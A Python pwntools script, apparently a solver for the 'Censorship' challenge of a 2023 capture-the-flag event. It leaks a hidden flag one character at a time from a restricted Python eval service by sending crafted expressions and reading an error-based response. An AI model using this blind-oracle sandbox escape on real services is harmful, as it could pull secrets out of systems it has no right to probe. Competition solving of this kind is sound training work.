### https://github.com/f0rk3b0mb/amatuerCTF_Censorship
### Code created by f0rk3b0mb
### for amatuerCTF 2023
### 16 july 2023

from pwn import *
import string

def send_data(hostname, port):
    try:
        # Create a TCP connection
        conn = remote(hostname, port)
        print("Connected to", hostname, "on port", port)
        char=string.printable
        found=[]
        while True:
          for i in char[:-6]:
            # Send data to the server
            data = f"if chr({ord(str(i))}) in _[{len(found)}]: ord(2)"
            print("trying ",i)

            conn.sendline(data)
            #print("Data sent successfully:", data)
            time.sleep(0.5)

            # Receive response from the server
            response = conn.recv(1024).decode()
            if 'int found' in response:
                found.append(i)
                print("Received response:", "".join(found))
    except Exception as e:
        print("An error occurred:", str(e))

    finally:
        # Close the connection
        conn.close()

send_data("amt.rs", 31670)

#nc amt.rs 31670
